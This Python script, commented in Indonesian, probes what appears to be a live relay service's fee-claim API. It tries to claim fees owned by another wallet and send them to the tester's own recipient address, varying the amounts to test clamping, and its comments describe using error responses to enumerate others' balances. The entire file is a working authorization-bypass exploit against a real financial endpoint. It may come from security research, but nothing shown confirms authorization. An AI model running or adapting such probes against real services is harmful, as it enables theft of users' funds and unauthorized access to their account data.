import json, urllib.request, urllib.error
BASE="https://api.relay.link"
USDC="0x833589fcd6edb6e08f4c7c32d4f71b54bda02913"
REC="0x48A7F32009473dE12582911CF0782e5268F2B9E4"
def req(m,p,b=None,t=25):
    d=json.dumps(b).encode() if b is not None else None
    r=urllib.request.Request(BASE+p,data=d,
        headers={"content-type":"application/json","accept":"application/json"},method=m)
    try:
        with urllib.request.urlopen(r,timeout=t) as x: return x.status,x.read().decode()
    except urllib.error.HTTPError as e: return e.code,e.read().decode()
    except Exception as e: return 0,f"ERR {e}"

# wallet dengan saldo fee ($0.013 tadi) - cek pesan error dipakai utk enumerasi saldo
W="0x0000000000000000000000000000000000000001"
print("### Kontrol: claim ke wallet KITA sendiri (saldo kita = 0)\n")
s,b=req("POST","/app-fees/%s/claim"%REC,{"chainId":8453,"currency":USDC,"recipient":REC})
print("claim ke wallet kita sendiri ->", s, b[:300], "\n")

print("### Uji: claim wallet ORANG, amount tepat = full balance\n")
s,b=req("POST","/app-fees/%s/claim"%W,{"chainId":8453,"currency":USDC,"recipient":REC,"amount":"13199"})
print("claim wallet asing ->", s, b[:400], "\n")

print("### Uji: claim wallet asing, amount besar (cek clamp)\n")
s,b=req("POST","/app-fees/%s/claim"%W,{"chainId":8453,"currency":USDC,"recipient":REC,"amount":"999999999999"})
print("amount overflow ->", s, b[:400], "\n")

print("### Uji: recipient != wallet (inti kerentanan)\n")
s,b=req("POST","/app-fees/%s/claim"%W,{"chainId":8453,"currency":USDC,"recipient":REC,"amount":"100000"})
print("recipient beda ->", s, b[:400])
